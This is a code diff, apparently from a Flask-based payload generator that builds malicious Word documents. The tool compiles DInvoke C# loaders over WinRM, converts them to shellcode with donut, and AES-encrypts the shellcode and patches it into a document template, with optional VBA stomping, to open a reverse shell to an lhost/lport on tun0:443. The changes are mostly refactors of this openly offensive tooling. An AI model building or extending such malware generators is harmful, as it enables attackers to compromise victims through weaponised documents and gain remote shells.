@@ -79,7 +79,7 @@ rest_PADDING = b"\x20"
 # EAS generator payload:
 PATH_WINRM_COMMANDS = "/tmp/winrm-commands.txt"
 PATH_TEMPLATE_CS_DINVOKE = "/mnt/exploits/DInvoke/setup/stage-12.cs"
-PAYLOAD_OUTPUT_PATH = f"{PAYLOAD_DIR}/stage-12.cs"
+PAYLOAD_OUTPUT_PATH = f"/tmp/stage-12.cs"
 WINRM_BUILDER_HOST = "10.1.1.51"
 WINRM_CREDENTIALS_FILE = "CREDS_WINRM_BUILDER.txt"
 
@@ -476,7 +476,10 @@ def generate_payload(
 
 
 def get_host():
-    host = request.headers['Incoming']
+    try:
+        host = request.headers['Incoming']
+    except:
+        host = ""
 
     if ':' in host:
         return host.split(':')[0], int(host.split(':')[1])
@@ -777,10 +780,11 @@ def word_form():
     import os
     template = ""
     template += f"<br>"
-    template += f"{request.headers['Incoming']}{request.path}?ladapter=tun0&lport=443&uid=test"
-    # template = template.replace('tun0', get_host()[0])
-    # template = "reminder:<br>"
-    # template += "?ladapter=eth0&lport=443&uid=test"
+    try:
+        template += f"{request.headers['Incoming']}"
+    except:
+        pass
+    template += f"{request.path}?ladapter=tun0&lport=443&uid=test"
     template += render_template('1_win_form.html')
 
     ladapter = request.args.get('ladapter', '')
@@ -840,10 +844,12 @@ def openssl_pbkdf2_encrypt(plaintext: bytes, password: str) -> bytes:
 
     return base64.b64encode(SALT_HEADER + salt + encrypted)
 
-
+# patch_document(doc_path, shellcode_path, output_path, password)
 def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, password: str):
     doc_data = doc_path.read_bytes()
-    raw_shellcode = shellcode_path.read_bytes()
+    with open(shellcode_path, 'rb') as f:
+        raw_shellcode = f.read()
+    # raw_shellcode = shellcode_path.read_bytes()
 
     print(
         f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
@@ -877,7 +883,7 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     )
 
     b64_pass = base64.b64encode(password.encode())
-    print(f"patch_document{b64_pass=}")
+    print(f"patch_document: {b64_pass=}")
 
     pwd_start_idx = patched.find(PWD_START)
     if pwd_start_idx == -1:
@@ -907,8 +913,8 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     out_path.write_bytes(patched)
 
     print(
-        f"[+] Patched '{out_path}'. Inserted {len(b64_payload)}‑byte payload "
-        f"and embedded {len(b64_pass)}‑byte password (region sizes preserved)."
+        f"[+] Patched '{out_path = }'. Inserted {len(b64_payload) = }‑byte payload "
+        f"and embedded {len(b64_pass) = }‑byte password (region sizes preserved)."
     )
 
 
@@ -942,8 +948,9 @@ def generate_encrypted_payloads(id: str, lhost: str, lport: int, password: str, 
 
 def run_winrm_commands(
     commands: List[str],
-    runtype: str = "os.popen"
+    runtype: str = "os.system"
 ) -> any:
+    print(f"run_winrm_commands: {commands=}")
     if runtype not in ("os.popen", "os.system"):
         raise ValueError(f"runtype must be 'os.popen' or 'os.system', got {runtype!r}")
 
@@ -963,7 +970,7 @@ def run_winrm_commands(
 
 
 
-
+DINVOKE_SHELLCODE_OUTPUT_PATH = "/tmp/loader.bin"
 
 
 def generate_dinvoke_x64_x86(input_data: Dict) -> Optional[BytesIO]:
@@ -1001,10 +1008,11 @@ def generate_dinvoke_x64_x86(input_data: Dict) -> Optional[BytesIO]:
     with open(PAYLOAD_OUTPUT_PATH, "w") as f:
         f.write(payload)
 
+    
     # Prepare WinRM commands
     winrm_command = rf"""del .\stage-12.cs
 del .\exploit-program.exe
-upload {PAYLOAD_OUTPUT_PATH}
+upload {"../" * 30}{PAYLOAD_OUTPUT_PATH}
 $dinvokePath = "C:\Tools\NuGetPkgs\DInvoke.1.0.4\lib\net35\DInvoke.dll"
 $sma = [System.Management.Automation.PowerShell].Assembly.Location
 & C:\Windows\Microsoft.NET\Framework\v4.0.*\csc.exe /resource:"$dinvokePath",DInvoke.dll /reference:"$sma" /target:exe /platform:anycpu /out:exploit-program.exe .\stage-12.cs /optimize+ /d:TRACE /filealign:512
@@ -1012,14 +1020,13 @@ cd donut*
 .\donut.exe ..\exploit-program.exe -o ..\exploit-program.bin
 cd ..
 download ./exploit-program.exe /tmp/loader.exe
-download ./exploit-program.bin /tmp/loader.bin
+download ./exploit-program.bin {DINVOKE_SHELLCODE_OUTPUT_PATH}
 exit"""
     
     # print(winrm_command)
     run_winrm_commands(winrm_command)
 
-    with open('/tmp/loader.bin', 'rb') as f:
-        return f.read()
+    return DINVOKE_SHELLCODE_OUTPUT_PATH
 
 
 
@@ -1102,30 +1109,34 @@ def generate_word_revshell_aes(lhost, lport, proxy, id, stomp_version, template_
 
     payload_entry = generate_dinvoke_x64_x86(payloads)
 
-    if isinstance(payload_entry, str):
-        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
-            shellcode = f.read()
-    elif isinstance(payload_entry, bytes):
-        shellcode = payload_entry
-    else:
-        raise ValueError("Unsupported shellcode payload type")
+    # if isinstance(payload_entry, str):
+    #     with open(f"{payload_entry}", 'rb') as f:
+    #         shellcode = f.read()
+    # elif isinstance(payload_entry, bytes):
+    #     shellcode = payload_entry
+    # else:
+    #     raise ValueError("Unsupported shellcode payload type")
 
-    with NamedTemporaryFile(delete=False) as shellcode_file:
-        shellcode_path = pathlib.Path(shellcode_file.name)
-        shellcode_file.write(shellcode)
+    # with NamedTemporaryFile(delete=False) as shellcode_file:
+    #     shellcode_path = pathlib.Path(shellcode_file.name)
+    #     shellcode_file.write(shellcode)
 
     doc_path = pathlib.Path(template_path)
     output_path = pathlib.Path(output_file_path)
 
-    print(f"patching document: {template_path = } {output_path = }")
-    patch_document(doc_path, shellcode_path, output_path, password)
+    print(f"patch_document({doc_path=}, {payload_entry=}, {output_path=}, {password=})")
+    patch_document(doc_path, payload_entry, output_path, password)
 
     if not stomp_version:
+        print("not_stomping:")
         with open(output_path, 'rb') as f:
-            return BytesIO(f.read())
+            retval = f.read()
     else:
+        print("stomping:")
         with open(stomp_doc(output_path, stomp_version), 'rb') as f:
-            return BytesIO(f.read())
+            retval = f.read()
+
+    return BytesIO(retval)
 
 
 def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_path: str) -> Optional[BytesIO]:
@@ -1313,8 +1324,10 @@ def lin_form():
     import os
     template = render_template('1_lin_form.html')
     ladapter = request.args.get('ladapter', '')
+    if ladapter == '':
+        ladapter = 'tun0'
     lport = request.args.get('lport', 443)
-    uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read())
+    uid = request.args.get('uid', os.popen("uuidgen | sed 's/-//g'").read()).strip()
     print(f"{ladapter=}")
     print(f"{lport=}")
     print(f"{uid=}")
